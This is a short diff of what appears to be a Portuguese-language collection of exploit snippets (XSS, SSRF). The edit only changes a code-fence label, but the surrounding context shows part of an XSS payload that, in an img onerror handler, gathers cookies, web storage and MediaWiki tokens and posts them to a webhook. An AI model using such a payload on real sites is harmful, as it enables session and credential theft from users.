@@ -74,7 +74,7 @@ Snippets de código para explorar vulnerabilidades como XSS, SSRF, etc.
 ```
 * **Payload XSS Avançado para Exfiltração de Dados:**
     * Este script captura cookies, `localStorage`, `sessionStorage`, tokens específicos de MediaWiki e informações do usuário, enviando tudo para um webhook.
-    ```javascript
+    ```html
     <img src="invalid" onerror="
   var data = {
     cookies: document.cookie,
@@ -127,6 +127,7 @@ Snippets de código para explorar vulnerabilidades como XSS, SSRF, etc.
     body: JSON.stringify(data)
   });
     ">
+
 ```
 
 ### Out-of-Band (OOB)
